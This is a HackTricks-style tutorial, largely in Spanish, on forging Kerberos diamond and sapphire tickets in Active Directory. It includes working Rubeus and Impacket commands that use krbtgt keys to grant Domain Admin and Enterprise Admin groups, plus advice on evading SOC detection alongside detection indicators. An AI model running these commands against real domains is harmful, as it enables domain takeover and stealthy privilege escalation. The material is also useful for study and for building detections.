# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Al igual que un golden ticket**, un diamond ticket es un TGT que puede usarse para **acceder a cualquier servicio como cualquier usuario**. Un golden ticket se forja completamente offline, se cifra con el hash krbtgt de ese dominio y luego se introduce en una sesión de inicio de sesión para su uso. Debido a que los controladores de dominio no realizan seguimiento de los TGTs que (ellos) han emitido legítimamente, aceptarán sin problema TGTs cifrados con su propio hash krbtgt.

Hay dos técnicas comunes para detectar el uso de golden tickets:

- Buscar TGS-REQs que no tengan un AS-REQ correspondiente.
- Buscar TGTs que tengan valores absurdos, como la duración por defecto de 10 años en Mimikatz.

Un **diamond ticket** se crea **modificando los campos de un TGT legítimo que fue emitido por un DC**. Esto se logra **solicitando** un **TGT**, **descifrándolo** con el hash krbtgt del dominio, **modificando** los campos deseados del ticket y luego **volviéndolo a cifrar**. Esto **supera las dos limitaciones mencionadas** de un golden ticket porque:

- Los TGS-REQs tendrán un AS-REQ previo.
- El TGT fue emitido por un DC, lo que significa que tendrá todos los detalles correctos de la política Kerberos del dominio. Aunque estos pueden forjarse con precisión en un golden ticket, es más complejo y propenso a errores.

### Requisitos y workflow

- **Material criptográfico**: la clave krbtgt AES256 (preferida) o el hash NTLM para poder descifrar y volver a firmar el TGT.
- **Blob legítimo de TGT**: obtenido con `/tgtdeleg`, `asktgt`, `s4u`, o exportando tickets desde la memoria.
- **Datos de contexto**: el RID del usuario objetivo, RIDs/SIDs de grupos, y (opcionalmente) atributos PAC derivados de LDAP.
- **Claves de servicio** (solo si planeas re-cut service tickets): clave AES del SPN del servicio que se va a suplantar.

1. Obtener un TGT para cualquier usuario controlado mediante AS-REQ (Rubeus `/tgtdeleg` es conveniente porque obliga al cliente a realizar el intercambio Kerberos GSS-API sin credenciales).
2. Descifrar el TGT devuelto con la clave krbtgt, parchear los atributos PAC (usuario, grupos, información de inicio de sesión, SIDs, claims del dispositivo, etc.).
3. Volver a cifrar/firmar el ticket con la misma clave krbtgt e inyectarlo en la sesión de inicio actual (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. Opcionalmente, repetir el proceso sobre un service ticket suministrando un TGT blob válido más la clave del servicio objetivo para mantener sigilo en la red.

### Tradecraft actualizado de Rubeus (2024+)

Trabajo reciente de Huntress modernizó la acción `diamond` dentro de Rubeus al portar las mejoras `/ldap` y `/opsec` que anteriormente existían solo para golden/silver tickets. `/ldap` ahora obtiene contexto PAC real consultando LDAP **y** montando SYSVOL para extraer atributos de cuentas/grupos además de la política Kerberos/contraseñas (p. ej., `GptTmpl.inf`), mientras que `/opsec` hace que el flujo AS-REQ/AS-REP coincida con Windows al realizar el intercambio de preauth en dos pasos y forzar AES-only + KDCOptions realistas. Esto reduce drásticamente indicadores obvios como campos PAC ausentes o duraciones que no coinciden con la política.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (con opcional `/ldapuser` y `/ldappassword`) consulta AD y SYSVOL para replicar los datos de la política PAC del usuario objetivo.
- `/opsec` fuerza un reintento AS-REQ al estilo Windows, poniendo a cero flags ruidosos y ciñéndose a AES256.
- `/tgtdeleg` evita tocar la contraseña en claro o la clave NTLM/AES de la víctima mientras aún devuelve un TGT descifrable.

### Service-ticket recutting

La misma actualización de Rubeus añadió la capacidad de aplicar la técnica diamond a blobs TGS. Al alimentar a `diamond` con un **base64-encoded TGT** (proveniente de `asktgt`, `/tgtdeleg` o de un TGT forjado previamente), el **service SPN**, y la **service AES key**, puedes generar tickets de servicio realistas sin tocar el KDC—efectivamente un silver ticket más sigiloso.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
Este flujo de trabajo es ideal cuando ya controlas la clave de una cuenta de servicio (por ejemplo, volcada con `lsadump::lsa /inject` o `secretsdump.py`) y quieres generar un TGS puntual que coincida perfectamente con la política de AD, las marcas temporales y los datos PAC sin emitir ningún tráfico AS/TGS nuevo.

### Sapphire-style intercambios de PAC (2025)

Una variación más reciente, a veces llamada **sapphire ticket**, combina la base "real TGT" de Diamond con **S4U2self+U2U** para robar un PAC privilegiado y colocarlo en tu propio TGT. En lugar de inventar SIDs adicionales, solicitas un ticket U2U S4U2self para un usuario de alto privilegio cuyo `sname` apunta al solicitante de bajo privilegio; la KRB_TGS_REQ transporta el TGT del solicitante en `additional-tickets` y configura `ENC-TKT-IN-SKEY`, permitiendo que el service ticket sea descifrado con la clave de ese usuario. Luego extraes el PAC privilegiado y lo injertas en tu TGT legítimo antes de volver a firmarlo con la clave krbtgt.

Impacket's `ticketer.py` ahora incluye soporte para sapphire mediante `-impersonate` + `-request` (intercambio en vivo con el KDC):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
- `-impersonate` accepts a username or SID; `-request` requires live user creds plus krbtgt key material (AES/NTLM) to decrypt/patch tickets.

Key OPSEC tells when using this variant:

- TGS-REQ will carry `ENC-TKT-IN-SKEY` and `additional-tickets` (the victim TGT) — rare in normal traffic.
- `sname` often equals the requesting user (self-service access) and Event ID 4769 shows the caller and target as the same SPN/user.
- Expect paired 4768/4769 entries with the same client computer but different CNAMES (low-priv requester vs. privileged PAC owner).

### OPSEC & notas de detección

- The traditional hunter heuristics (TGS without AS, decade-long lifetimes) still apply to golden tickets, but diamond tickets mainly surface when the **PAC content or group mapping looks impossible**. Populate every PAC field (logon hours, user profile paths, device IDs) so automated comparisons do not immediately flag the forgery.
- **No asignes en exceso grupos/RIDs**. If you only need `512` (Domain Admins) and `519` (Enterprise Admins), stop there and make sure the target account plausibly belongs to those groups elsewhere in AD. Excessive `ExtraSids` is a giveaway.
- Sapphire-style swaps leave U2U fingerprints: `ENC-TKT-IN-SKEY` + `additional-tickets` plus a `sname` that points at a user (often the requester) in 4769, and a follow-up 4624 logon sourced from the forged ticket. Correlate those fields instead of only looking for no-AS-REQ gaps.
- Microsoft started phasing out **RC4 service ticket issuance** because of CVE-2026-20833; enforcing AES-only etypes on the KDC both hardens the domain and aligns with diamond/sapphire tooling (/opsec already forces AES). Mixing RC4 into forged PACs will increasingly stick out.
- Splunk's Security Content project distributes attack-range telemetry for diamond tickets plus detections such as *Windows Domain Admin Impersonation Indicator*, which correlates unusual Event ID 4768/4769/4624 sequences and PAC group changes. Replaying that dataset (or generating your own with the commands above) helps validate SOC coverage for T1558.001 while giving you concrete alert logic to evade.

## Referencias

- [Palo Alto Unit 42 – Precious Gemstones: The New Generation of Kerberos Attacks (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [Core Security – Impacket: We Love Playing Tickets (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
